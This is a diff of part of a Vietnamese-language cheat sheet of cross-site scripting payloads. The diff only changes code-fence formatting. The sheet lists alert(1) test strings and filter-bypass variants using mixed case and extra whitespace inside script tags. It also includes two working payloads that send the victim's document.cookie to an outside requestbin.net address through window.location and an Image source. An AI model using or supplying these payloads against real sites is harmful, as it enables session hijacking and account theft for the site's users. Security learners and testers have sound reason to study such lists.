@@ -21,33 +21,34 @@ Tùy thuộc vào cơ chế filter mà có các cách bypass khác nhau. Nếu v
 ## Các load js nguyên thủy (Không mask) huyền thoại 
 ### Alert message
 
-```js
+```
 <script>alert(1);</script>
 ```
 
 ### Dùng window location
 
-```js
+```
 <script>window.location="http://requestbin.net/r/9d4pj5wl?c=".concat(document.cookie)</script>
 ```
 
 ### Dùng image
 
-```js
+```
 <script>new Image().src="http://requestbin.net/r/9d4pj5wl?c=".concat(document.cookie);</script>
 ```
 
 ## Các payload sử dụng mask
 ### Case sensitive
 
-```js
+```
 <SCRIPT>alert(1);</SCRIPT>
+
 <ScRipT>alert(1);</sCriPt>
 ```
 ### Lọc thẻ script
 * Insert thêm ký tự trình duyệt hay bỏ qua (Tab, escape)
 
-```js
+```
 <script  >alert(1);</script   >
 ```
 
